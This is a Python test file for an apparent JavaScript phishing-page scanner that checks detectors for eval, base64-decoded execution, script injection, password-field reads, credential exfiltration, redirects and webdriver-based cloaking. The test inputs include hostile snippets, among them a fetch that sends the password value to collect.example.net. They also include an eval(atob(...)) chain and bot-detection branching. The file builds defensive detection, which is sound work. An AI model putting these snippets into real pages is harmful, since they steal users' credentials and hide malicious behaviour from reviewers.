from __future__ import annotations

from L3_SCANNER.analyzers.javascript import analyze_javascript
from L3_SCANNER.analyzers.javascript import (
    analyze_j01,
    analyze_j02,
    analyze_j03,
    analyze_j04,
    analyze_j05,
    analyze_j06,
    analyze_j07,
    analyze_j08,
    analyze_j09,
)
from L3_SCANNER.models.input import HTMLInput, L3Input, ScriptInput
from L3_SCANNER.parsers.html_parser import parse_html
from L3_SCANNER.parsers.javascript_parser import parse_javascript
from L3_SCANNER.policies.detection import DetectionPolicy

DOCUMENT_URL = "https://login.example.com/account"


def credential_classifier(field):
    return "password" if field.get("type") == "password" else None


def policy(**overrides):
    values = {
        "credential_classifier": credential_classifier,
        "dynamic_execution_apis": frozenset({"eval", "Function"}),
        "decode_methods": frozenset({"atob"}),
        "network_apis": frozenset({"fetch"}),
        "redirect_apis": frozenset({"location.replace", "location.href"}),
        "anti_bot_properties": frozenset({"navigator.webdriver"}),
        "branch_behavior_normalizer": lambda branch: repr(
            branch.get("observations", [])
        ),
    }
    values.update(overrides)
    return DetectionPolicy(**values)


def raw(source: str, active_policy: DetectionPolicy | None = None):
    scan_input = L3Input(
        DOCUMENT_URL,
        DOCUMENT_URL,
        HTMLInput('<form><input id="password" type="password"></form>'),
        [ScriptInput("script-1", "inline", source=source)],
    )
    html_raw = parse_html(scan_input.html.content, scan_input.document_url)
    return parse_javascript(scan_input, html_raw, active_policy or policy())


def test_j01_call_positive_reference_negative_and_missing_policy_unresolved() -> None:
    assert analyze_j01(raw("eval('x')"))["detected"] is True
    assert analyze_j01(raw("const fn = eval"))["detected"] is False
    assert analyze_j01(raw("eval('x')", DetectionPolicy()))["detected"] is None


def test_j02_requires_decode_to_execution_link() -> None:
    positive = analyze_j02(raw("eval(atob('YWJj'))"))
    decode_only = analyze_j02(raw("const value = atob('YWJj')"))
    assert positive["detected"] is True
    assert positive["evidence"]["chain"] == ["atob", "eval"]
    assert decode_only["detected"] is False
    assert decode_only["evidence"]["execution_connected"] is False


def test_j03_detects_dynamic_insertion_even_when_url_is_not_external() -> None:
    positive = analyze_j03(
        raw(
            "const s=document.createElement('script'); s.src='/a.js'; document.body.appendChild(s)"
        )
    )
    negative = analyze_j03(
        raw("const d=document.createElement('div'); document.body.appendChild(d)")
    )
    assert positive["detected"] is True
    assert positive["evidence"]["urls"] == ["https://login.example.com/a.js"]
    assert negative["detected"] is False


def test_j04_observes_destination_and_keeps_unknown_destination_unresolved() -> None:
    positive = analyze_j04(raw("fetch('https://api.example.net/x')"))
    negative = analyze_j04(raw("const x = 1"))
    unknown = analyze_j04(raw("fetch(target)"))
    assert positive["detected"] is True
    assert positive["evidence"]["destinations"][0]["external"] is True
    assert negative["detected"] is False
    assert unknown["detected"] is None


def test_j05_credential_access_positive_negative_and_policy_unresolved() -> None:
    positive = analyze_j05(raw("document.getElementById('password').value"))
    negative = analyze_j05(raw("document.title"))
    unresolved = analyze_j05(
        raw("document.getElementById('password').value", DetectionPolicy())
    )
    assert positive["detected"] is True
    assert positive["evidence"]["fields"] == ["password"]
    assert negative["detected"] is False
    assert unresolved["detected"] is None


def test_j06_requires_linked_source_sink_and_external_destination() -> None:
    linked = analyze_j06(
        raw(
            "const p=document.getElementById('password').value; "
            "fetch('https://collect.example.net/x', {body: JSON.stringify(p)})"
        )
    )
    unrelated = analyze_j06(
        raw(
            "document.getElementById('password').value; "
            "fetch('https://collect.example.net/x', {body: 'public'})"
        )
    )
    same_site = analyze_j06(
        raw(
            "const p=document.getElementById('password').value; "
            "fetch('/submit', {body: p})"
        )
    )
    unknown_destination = analyze_j06(
        raw(
            "const p=document.getElementById('password').value; "
            "fetch(target, {body: p})"
        )
    )
    assert linked["detected"] is True
    assert linked["evidence"]["transformations"] == ["JSON.stringify"]
    assert unrelated["detected"] is None
    assert same_site["detected"] is False
    assert unknown_destination["detected"] is None


def test_j07_dynamic_redirect_positive_negative_and_unknown_target() -> None:
    positive = analyze_j07(raw("location.replace('/next')"))
    negative = analyze_j07(raw("const next = '/next'"))
    unknown = analyze_j07(raw("location.replace(target)"))
    assert positive["detected"] is True
    assert positive["evidence"]["destination_url"] == "https://login.example.com/next"
    assert negative["detected"] is False
    assert unknown["detected"] is True
    assert unknown["evidence"]["destination_url"] is None


def test_j08_configured_environment_check_positive_and_read_absence_negative() -> None:
    assert (
        analyze_j08(raw("if (navigator.webdriver) { blocked() }"))["detected"] is True
    )
    assert analyze_j08(raw("const language = navigator.language"))["detected"] is False
    assert (
        analyze_j08(raw("navigator.webdriver", DetectionPolicy()))["detected"] is None
    )


def test_j09_requires_environment_condition_and_distinct_normalized_behaviors() -> None:
    positive_raw = raw(
        "if (navigator.webdriver) { location.replace('/bot') } else { showLogin() }"
    )
    read_only = analyze_j09(raw("const bot = navigator.webdriver"), policy())
    same_behavior = analyze_j09(
        raw("if (navigator.webdriver) { render() } else { render() }"), policy()
    )
    no_normalizer_policy = policy(branch_behavior_normalizer=None)
    unresolved_raw = raw(
        "if (navigator.webdriver) { hide() } else { show() }", no_normalizer_policy
    )
    assert analyze_j09(positive_raw, policy())["detected"] is True
    assert read_only["detected"] is False
    assert same_behavior["detected"] is False
    assert analyze_j09(unresolved_raw, no_normalizer_policy)["detected"] is None


def test_missing_source_is_error_for_negative_but_does_not_hide_positive_observation() -> (
    None
):
    value = L3Input(
        DOCUMENT_URL,
        DOCUMENT_URL,
        HTMLInput("<html></html>"),
        [
            ScriptInput("inline", "inline", source="eval('x')"),
            ScriptInput(
                "external", "external", source_url="https://cdn.example.net/x.js"
            ),
        ],
    )
    parsed = parse_javascript(value, policy=policy())
    assert analyze_j01(parsed)["detected"] is True
    assert analyze_j03(parsed)["status"] == "error"
    assert analyze_j03(parsed)["detected"] is None


def test_all_javascript_signals_are_ordered_and_no_scripts_are_not_applicable() -> None:
    value = L3Input(DOCUMENT_URL, DOCUMENT_URL, HTMLInput("<html></html>"), [])
    parsed = parse_javascript(value, policy=policy())
    signals = analyze_javascript(parsed, policy())
    assert [signal["id"] for signal in signals] == [
        f"L3-J-{index:02d}" for index in range(1, 10)
    ]
    assert all(signal["status"] == "not_applicable" for signal in signals)
    assert all(signal["detected"] is None for signal in signals)


def test_parse_failure_is_not_reported_as_negative() -> None:
    parsed = raw("function broken( {")
    signals = analyze_javascript(parsed, policy())
    assert all(signal["status"] == "error" for signal in signals)
    assert all(signal["detected"] is None for signal in signals)
